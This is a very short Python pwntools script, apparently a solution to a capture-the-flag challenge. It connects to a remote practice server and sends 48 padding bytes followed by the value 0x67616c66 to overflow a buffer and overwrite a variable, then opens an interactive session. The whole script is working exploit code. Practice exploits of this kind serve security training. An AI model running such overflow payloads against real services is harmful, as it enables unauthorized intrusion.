from pwn import *

r = remote('thekidofarcrania.com', 35235)
payload = b'b' * 48
payload += p32(0x67616c66)

r.sendline(payload)
r.interactive()
